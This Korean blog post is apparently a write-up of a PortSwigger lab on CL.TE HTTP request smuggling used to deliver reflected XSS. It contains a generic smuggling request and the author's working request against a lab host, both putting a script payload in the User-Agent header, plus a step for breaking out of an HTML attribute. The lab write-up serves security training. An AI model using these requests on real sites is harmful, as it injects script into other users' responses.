---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: Exploiting HTTP request smuggling to deliver reflected XSS"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2024-01-24 21:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss
- 취약점 설명페이지1: https://portswigger.net/web-security/request-smuggling
- 취약점 설명페이지2: https://portswigger.net/web-security/request-smuggling/exploiting
- 난이도: PRACTITIONER (보통)

# 취약점 개요 (Using HTTP request smuggling to exploit reflected XSS)
웹 어플리케이션에 HTTP 요청 스머글링이 가능하고, 반사형 XSS 취약점이 존재한다면, 스머글링을 통해 다른 유저에게 XSS 공격을 할 수 있다. 이 공격은 보통의 XSS보다 훨씬 강력한데, 이유는 다음 두 가지다. 

1. 유저의 인터랙션이 필요없다! 💣 즉, 유저에게 URL을 보내고 방문하는 것을 기다릴 필요가 없다. 
2. 보통의 반사형 XSS에서는 공격에 사용할 수 없는 부분 (예를들면 HTTP요청 헤더)에 까지 XSS 페이로드를 지정할 수 있다. 
(보통의 반사형 XSS에서는 URL에 지정가능한 파라메터가 HTTP응답에 나타나서 발생하는 방식이다. 따라서 공격가능 포인트는 파라메터가 된다.)

예를 들면 다음과 같다. 스머글링용 요청의 User-Agent 헤더에 XSS 페이로드가 지정되어 있다. 

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```


# 랩 개요
- 이 랩은 프론트 엔드 서버와 백엔드 서버로 구성되어 있다. 프론트 엔드 서버는 chunked encoding(TE헤더)을 지원하지 않는다. (즉, CL.TE패턴이다.)
- 어플리케이션에는 User-Agent 헤더에 반사형 XSS취약점이 있다. 
- 랩을 풀려면 백엔드 서버에게 HTTP요청을 밀반입해서, 다른 유저의 요청에 대한 응답으로 XSS페이로드를 포함한 응답이 돌아가도록 만들어 alert(1)을 동작시키면 된다. 
- 랩은 Victim의 행동을 시뮬레이션하고 있다. 몇 개의 POST요청이 발생할 때마다 victim도 요청을 보낸다. 

```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

The application is also vulnerable to reflected XSS via the User-Agent header.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1).

The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
```

# 풀이 
1. 문제를 풀려면 두 가지가 확인되어야 한다. 먼저 HTTP Request Smuggling이 가능한 곳을 찾아야 한다. 그리고 User-Agent로 반사형 XSS가 가능한 곳을 찾아야 한다. 

2. XSS가 가능한 곳은 Burp Scanner를 통해서 찾았다. 포스트의 상세를 조회하는 곳 `GET /post?postId=1`이었다. 

3. 다음 공격 페이로드를 준비했다. 

```http
POST / HTTP/1.1
Host: 0a1300a203e4364c80bad0960051006c.web-security-academy.net
Cookie: session=uiMLoWX19LHH2HSGHxnXw1HI7Nygc0ft
Content-Length: 79
Transfer-Encoding: chunked

0

GET /post?postId=1 HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

4. 요청을 두번보내면 응답에서 다음과 같이 `<script>alert(1)</script>`가 표시되고 있는 것을 볼 수 있다. 

![HTTP 스머글링 시도-1](/images/burp-academy-hrs-10-1.png)

5. 페이로드가 HTML 엘레먼트로 동작되도록 앞에 `"/>`를 붙여준다. 그러면 다음과 같이 `<script>`태그가 밖으로 나온다. 이 상태라면 Javascript가 동작한다. 

![HTTP 스머글링 시도-2](/images/burp-academy-hrs-10-2.png)

6. 페이로드를 다시 보낸다. 그러면 Victim이 사이트에 찾아오는 시뮬레이션이 수행되고 문제가 풀렸다는 메세지가 표시된다. 

![풀이 성공](/images/burp-academy-hrs-10-success.png)
